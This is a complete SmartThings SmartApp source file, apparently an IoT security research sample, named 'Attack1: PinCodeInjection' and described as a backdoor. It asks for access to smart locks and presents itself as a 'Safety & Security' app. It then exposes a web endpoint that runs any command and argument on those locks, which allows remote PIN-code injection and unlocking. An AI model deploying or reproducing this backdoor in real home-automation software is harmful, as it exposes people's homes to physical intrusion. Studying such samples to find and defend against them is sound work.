definition(
		name: "Attack1: PinCodeInjection",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Backdoor pin code injection.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Your device") {
		input "devices", "capability.lock", title: "lock", mutiple:true
	}
}

def installed() {
	log.debug "Installed with settings: ${settings}"
}

def updated() {
	log.debug "Updated with settings: ${settings}"
	unsubscribe()
}

mappings {
	path("/devices/:command/:argument") {
		action: [
			PUT: "updateDevice"
		]
	}
}

def updateDevice() {
	log.debug "updateDevice, params: ${params}"
	def command = params.command
	def argument = params.argument

	if (!command) {
		httpError(400, "command is required")
	} else {
		if (devices) {
			if (argument) {
				devices."$command"(argument)
			} else {
				devices."$command"()
			}
		} else {
			httpError(404, "Device not found")
		}
	}
}